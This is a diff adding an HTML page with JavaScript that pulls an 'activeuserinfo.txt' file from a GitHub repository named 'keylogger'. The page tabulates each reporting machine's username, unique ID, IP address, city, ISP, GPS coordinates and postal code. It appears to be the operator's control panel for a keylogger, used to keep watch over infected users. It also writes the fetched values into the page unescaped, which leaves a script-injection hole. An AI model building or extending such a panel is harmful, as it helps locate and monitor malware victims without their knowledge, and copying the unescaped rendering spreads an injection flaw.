@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitHub File Viewer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        th,
+        td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+
+        th {
+            background-color: #f2f2f2;
+            font-weight: bold;
+        }
+
+        tr:nth-child(even) {
+            background-color: #f9f9f9;
+        }
+
+        tr:hover {
+            background-color: #f1f1f1;
+        }
+
+        .summary {
+            margin-top: 20px;
+            font-size: 16px;
+            text-align: center;
+        }
+
+        .loading {
+            text-align: center;
+            font-size: 18px;
+            color: #555;
+            margin-top: 20px;
+        }
+
+        .refresh-btn {
+            display: block;
+            margin: 20px auto;
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .refresh-btn:hover {
+            background-color: #0056b3;
+        }
+
+        .line-input {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .line-input input {
+            padding: 8px;
+            width: 60px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Last N Lines Data from GitHub File</h1>
+        <div class="summary" id="summary"></div>
+        <div class="loading" id="loading">Fetching data...</div>
+        <table id="data-table">
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>Timestamp</th>
+                    <th>Username</th>
+                    <th>Unique ID</th>
+                    <th>IP</th>
+                    <th>Location</th>
+                    <th>Org</th>
+                    <th>Coordinates</th>
+                    <th>Postal</th>
+                </tr>
+            </thead>
+            <tbody>
+                <!-- Rows will be dynamically inserted here -->
+            </tbody>
+        </table>
+        <div class="line-input">
+            <label for="line-count">Fetch Last</label>
+            <input type="number" id="line-count" value="10" min="1">
+            <button class="refresh-btn" id="refresh-btn">Refresh Data</button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const githubToken = 'add_your_token_here'; // Replace with your GitHub PAT
+            const repoUrl = 'https://api.github.com/repos/bebedudu/keylogger/contents/uploads/activeuserinfo.txt';
+            const tableBody = document.querySelector('#data-table tbody');
+            const summaryElement = document.getElementById('summary');
+            const loadingElement = document.getElementById('loading');
+            const refreshButton = document.getElementById('refresh-btn');
+            const lineCountInput = document.getElementById('line-count');
+
+            // Function to fetch the file content from GitHub
+            async function fetchFileContent() {
+                try {
+                    // Show loading message
+                    tableBody.innerHTML = ''; // Clear previous data
+                    loadingElement.style.display = 'block';
+
+                    const response = await fetch(repoUrl, {
+                        headers: {
+                            'Authorization': `token ${githubToken}`,
+                            'Accept': 'application/vnd.github.v3.raw'
+                        }
+                    });
+
+                    if (!response.ok) {
+                        throw new Error(`Error fetching file: ${response.status} ${response.statusText}`);
+                    }
+
+                    const content = await response.text();
+                    const lines = content.split('\n').filter(line => line.trim()); // Remove empty lines
+
+                    // Get the number of lines to fetch from the input field
+                    const lineCount = parseInt(lineCountInput.value, 10) || 10; // Default to 10 if invalid
+                    const lastLines = lines.slice(-lineCount);
+
+                    // Parse all lines and group by unique usernames
+                    const userDataMap = new Map(); // Key: username, Value: { details }
+                    lastLines.forEach(line => {
+                        const parsedData = parseLine(line);
+                        if (parsedData) {
+                            const { username } = parsedData;
+
+                            // Only keep the last occurrence of each username
+                            userDataMap.set(username, parsedData);
+                        }
+                    });
+
+                    // Display summary of unique users
+                    const uniqueUserCount = userDataMap.size;
+                    summaryElement.textContent = `Total Unique Users in Last ${lineCount} Lines: ${uniqueUserCount}`;
+
+                    // Populate the table with unique user details
+                    let index = 0;
+                    tableBody.innerHTML = ''; // Clear previous rows
+                    userDataMap.forEach((data) => {
+                        addRowToTable(index++, data);
+                    });
+
+                    // Hide loading message
+                    loadingElement.style.display = 'none';
+                } catch (error) {
+                    console.error('Error:', error);
+                    loadingElement.textContent = 'Failed to load data.';
+                    tableBody.innerHTML = '<tr><td colspan="9">Failed to load file content.</td></tr>';
+                }
+            }
+
+            // Function to parse a single line of data
+            function parseLine(line) {
+                // Regex to match the data format
+                const regex = /(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}) - User:\s*(\w+),\s*Unique_ID:\s*([\w:-]+)\s*,\s*IP:\s*([\d.]+),\s*Location:\s*([\w, ]+),\s*Org:\s*([\w ]+),\s*Coordinates:\s*([\d.-]+,[\d.-]+),\s*Postal:\s*(\d+)/;
+                const match = line.match(regex);
+
+                if (match) {
+                    // Extract the country code from the Location field
+                    const locationParts = match[5].split(',').map(part => part.trim());
+                    const countryCode = locationParts[0]; // First part is the country code (e.g., "IN")
+
+                    return {
+                        timestamp: match[1],
+                        username: `${match[2]}_${countryCode}_${match[3]}`, // Format: username_Country_UniqueID
+                        uniqueID: match[3],
+                        ip: match[4],
+                        location: match[5],
+                        org: match[6],
+                        coordinates: match[7],
+                        postal: match[8]
+                    };
+                }
+                console.error('Regex did not match:', line); // Log unmatched lines for debugging
+                return null;
+            }
+
+            // Function to add a row to the table
+            function addRowToTable(index, data) {
+                if (!data) return;
+                const row = document.createElement('tr');
+                row.innerHTML = `
+            <td>${index}</td>
+            <td>${data.timestamp}</td>
+            <td>${data.username}</td>
+            <td>${data.uniqueID}</td>
+            <td>${data.ip}</td>
+            <td>${data.location}</td>
+            <td>${data.org}</td>
+            <td>${data.coordinates}</td>
+            <td>${data.postal}</td>
+        `;
+                tableBody.appendChild(row);
+            }
+
+            // Add event listeners
+            refreshButton.addEventListener('click', () => {
+                fetchFileContent();
+            });
+
+            lineCountInput.addEventListener('input', () => {
+                fetchFileContent();
+            });
+
+            // Initial data fetch
+            fetchFileContent();
+        });
+    </script>
+</body>
+
+</html>
